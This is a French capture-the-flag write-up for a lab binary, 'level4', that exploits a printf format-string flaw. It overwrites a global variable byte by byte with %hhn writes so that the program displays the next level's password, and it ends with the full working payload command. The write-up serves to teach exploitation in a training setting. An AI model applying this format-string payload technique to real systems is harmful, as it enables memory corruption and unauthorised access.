## Le programme
Le programme appelle la fonction n, qui fait un fgets, puis un printf. Ensuite, si la valeur de m est 0x01025544, le programme fait un appel system pour afficher le .pass du level5.

## La faille
Comme pour le precedent level, la faille reside dans l'utilisation de printf avec un format string que l'on peut controller. Cependant la valeur de m est trop grande pour l'ecrire d'un seul coup dans le format string, donc il faudra faire plus d'etapes pour reussir a ecrire la valeur qui nous interesse dans m.

## La solution
> adresse de m: 0x08049810 \
> index de l'argument qui debute au buffer: 9

Il faut que m ait la valeur 0x01025544. Cette valeur est trop grande pour l'ecrire d'un seul coup a l'aide du printf dans le buffer.
Il faudra donc la diviser en plusieurs morceaux, du plus petit au plus grand:
```
0x01 =  1 a l'adresse 0x08049813 (           1 caractere)
0x02 =  2 a l'adresse 0x08049812 ( 2 -  1 =  1 caractere)
0x44 = 68 a l'adresse 0x08049810 (68 -  2 = 66 caractere)
0x55 = 85 a l'adresse 0x08049811 (85 - 68 = 17 caractere)
```

Puisqu'on doit ecrire un byte a la fois, il faudra utiliser le modifier hh en plus du specifier n, pour que printf ecrive seulement 1 byte. Autrement printf overwritera d'autres bytes avec des 0: `%??$hhn`

## Trouver l'index des arguments et le format string
Il est tres probable que l'index de nos arguments est entre 10 et 99 donc on prevoit deux caracteres apres le %. Pour trouver l'index des arguments rapidement on s'aide d'un calcul qui va nous donner une valeur plausible:
```
valeur_max + 4 * (pourcent + index + dollar + hhn)
= 85 + 4 * (1 + 2 + 1 + 3)
= 113

113 n'est pas un multiple de 4, donc on arrondi a 116:
116 / 4 + 9
= 29 + 9
= 38
```

Puisque 113 n'est pas un multiple de 4, il faudra rajouter 3 bytes pour que nos adresses soient alignees correctement.

La chaine a ecrire est la suivante:
```
a%??$hhn
b%??$hhn
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1%??$hhn
Aa0Aa1Aa2Aa3Aa4Aa%??$hhn
abc
\x13\x98\x04\x08
\x12\x98\x04\x08
\x11\x98\x04\x08
\x10\x98\x04\x08
```

En testant on trouve que l'index reel est 41, ce qui n'est pas loin de notre calcul.

Voici un format string qui printera chaque argument qui nous interesse avec %x, tout en gardant le meme nombre de caracteres. Cela nous permettra de verifier que nos arguments pointent bien vers les bonnes valeurs:
```
$> printf "ahh%%41\$xbhh%%42\$xAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1hh%%44\$xAa0Aa1Aa2Aa3Aa4Aahh%%43\$xabc\x13\x98\x04\x08\x12\x98\x04\x08\x11\x98\x04\x08\x10\x98\x04\x08\n" | ./level4
```

Par ailleurs, le programme test.c verifie que notre chaine ecrit bien la valeur finale 0x01025544.

## La commande finale
```
$> printf "a%%41\$hhnb%%42\$hhnAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1%%44\$hhnAa0Aa1Aa2Aa3Aa4Aa%%43\$hhnabc\x13\x98\x04\x08\x12\x98\x04\x08\x11\x98\x04\x08\x10\x98\x04\x08\n" > /tmp/level4.txt
$> cat /tmp/level4.txt - | ./level4
```
